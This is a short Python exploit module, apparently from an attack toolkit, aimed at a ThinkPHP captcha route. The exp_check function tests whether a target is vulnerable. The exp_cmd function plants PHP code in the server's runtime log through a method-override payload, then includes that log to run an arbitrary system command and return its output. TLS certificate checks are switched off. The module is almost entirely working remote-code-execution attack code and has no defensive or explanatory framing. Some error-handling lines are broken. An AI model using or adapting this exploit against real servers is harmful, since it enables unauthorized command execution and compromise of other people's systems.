import ssl
import urllib.request
import requests
import datetime


headers = {
    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 12_10) AppleWebKit/600.1.25 (KHTML, like Gecko) Version/12.0 Safari/1200.1.25',
    'Content-Type': 'application/x-www-form-urlencoded',
}

def exp_check(url):
    try:
       
        now = datetime.datetime.now()
        data = now.strftime("%Y%m/%d")
        context = ssl._create_unverified_context()
        req = urllib.request.Request(url+"/index.php?s=captcha",data="_method=__construct&method=get&filter[]=call_user_func&server[]=phpinfo&get[]=<?php var_dump('check')?>".encode("utf-8"),headers=headers)
        urllib.request.urlopen(req,context=context)
        rp = requests.post(url+"/index.php?s=captcha",headers=headers,data="_method=__construct&method=get&filter[]=think__include_file&server[]=phpinfo&get[]=../runtime/log/"+data+".log",verify=False,timeout=10)
        if rp.status_code==200 and 'check' in rp.text:
            return 1
        else:
            return 2
    except Exception as e:
        str(e)+str(e.__traceback__.tb_lineno)+'行'
        return 3

def exp_cmd(url,cmd):
    try:
       
        now = datetime.datetime.now()
        data = now.strftime("%Y%m/%d")
        context = ssl._create_unverified_context()
        str = "_method=__construct&method=get&filter[]=call_user_func&server[]=phpinfo&get[]=<?php system("+{}+")?>".format(cmd)
        req = urllib.request.Request(url+"/index.php?s=captcha",data=str.encode("utf-8"),headers=headers)
        urllib.request.urlopen(req,context=context)
        rp = requests.post(url+"/index.php?s=captcha",headers=headers,data="_method=__construct&method=get&filter[]=think__include_file&server[]=phpinfo&get[]=../runtime/log/"+data+".log",verify=False,timeout=10)
        if rp.text!="" and rp.status_code == 200:
            return rp.text

    except Exception as e:
        str(e)+str(e.__traceback__.tb_lineno)+'行'
        return 3